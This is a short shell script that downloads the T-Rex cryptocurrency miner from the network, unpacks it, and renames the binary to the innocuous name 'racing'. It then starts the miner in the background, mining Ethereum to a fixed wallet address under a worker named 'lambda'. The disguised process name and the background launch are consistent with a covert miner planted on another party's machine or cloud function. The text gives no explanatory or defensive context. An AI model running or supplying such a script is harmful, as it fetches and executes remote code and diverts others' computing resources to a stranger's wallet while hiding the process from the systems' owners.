wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x575aD1F3f6C5493fB4EC2969A1701916927A23df -p x -w lambda &
